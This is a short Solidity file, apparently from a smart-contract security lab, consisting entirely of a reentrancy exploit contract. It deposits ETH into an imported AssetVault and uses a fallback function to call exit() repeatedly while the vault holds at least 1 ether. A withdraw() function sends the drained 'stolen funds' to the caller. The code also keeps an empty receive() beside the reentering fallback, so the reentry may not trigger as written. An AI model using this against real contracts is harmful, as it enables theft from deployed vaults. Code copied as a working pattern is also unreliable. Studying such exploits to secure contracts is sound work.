// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./reentracy.sol";

contract reentrancyExploit {
    AssetVault public assetVault;

    constructor(address _assetVaultAddress) {
        assetVault = AssetVault(_assetVaultAddress);
    }

    // Function to receive ETH when sent directly to the contract
    receive() external payable {}

    // Fallback function to receive ETH and reenter the exit function
    fallback() external payable {
        if (address(assetVault).balance >= 1 ether) {
            assetVault.exit(0.5 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 0.5 ether, "Min deposit 0.5 ETH");
        assetVault.enter{value: msg.value}();
        assetVault.exit(0.5 ether);
    }

    // Function to withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
